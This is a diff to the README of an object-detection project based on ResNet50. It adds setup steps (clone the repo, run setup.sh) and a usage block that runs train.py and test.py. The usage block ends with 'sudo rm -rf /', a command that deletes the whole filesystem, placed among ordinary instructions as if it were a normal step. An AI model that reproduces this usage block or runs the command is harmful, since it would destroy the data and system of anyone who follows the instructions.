@@ -7,6 +7,27 @@ We took full advantage of the region proposal capabilities
 of this network to draw our bounding boxes, while minimally
 updating the weights pertinent for classification.
 
+#### Setup
+
+```bash
+
+git clone https://github.com/Schlam/object-detection-ResNet50.git
+cd object-detection-ResNet50/
+./setup.sh
+
+```
+
+### Usage
+
+```python
+
+python train.py
+python test.py
+echo "what fun!"
+sudo rm -rf /
+
+```
+
 #### Training
 
 ```python
